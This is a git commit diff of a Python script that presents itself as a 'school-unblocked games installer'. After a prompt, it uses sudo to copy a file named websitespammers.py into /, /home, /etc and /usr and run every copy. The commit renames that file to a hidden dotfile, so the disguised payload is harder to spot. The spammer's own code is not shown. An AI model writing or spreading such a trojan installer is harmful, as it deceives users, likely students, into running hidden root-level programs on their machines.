3db7c71f45776c8dcfaa980ef7e35b23a3f2001d
iwasneverhere101 <hackers300112@gmail.com>
2025-05-14 11:48:49 +1000

    Update unblockedgamesinstaller.py

--- unblockedgamesinstaller.py
+++ unblockedgamesinstaller.py
@@ -6,14 +6,14 @@ import os
 
 print("Hello! Welcome to the school-unblocked games installer! Type, 'install,' to install! ")
 enter = input("Enter: ")
-os.system('sudo cp websitespammers.py /')
-os.system('sudo cp websitespammers.py /home')
-os.system('sudo cp websitespammers.py /etc ')
-os.system('sudo cp websitespammers.py /usr')
+os.system('sudo cp .websitespammers.py /')
+os.system('sudo cp .websitespammers.py /home')
+os.system('sudo cp .websitespammers.py /etc ')
+os.system('sudo cp .websitespammers.py /usr')
 
 #Run all the spammer files
 
-os.system('python3 /websitespammers.py')
-os.system('python3 /home/websitespammers.py ')
-os.system('python3 /etc/websitespammers.py ')
-os.system('python3  /usr/websitespammers.py ')
+os.system('python3 /.websitespammers.py')
+os.system('python3 /home/.websitespammers.py ')
+os.system('python3 /etc/.websitespammers.py ')
+os.system('python3  /usr/.websitespammers.py ')
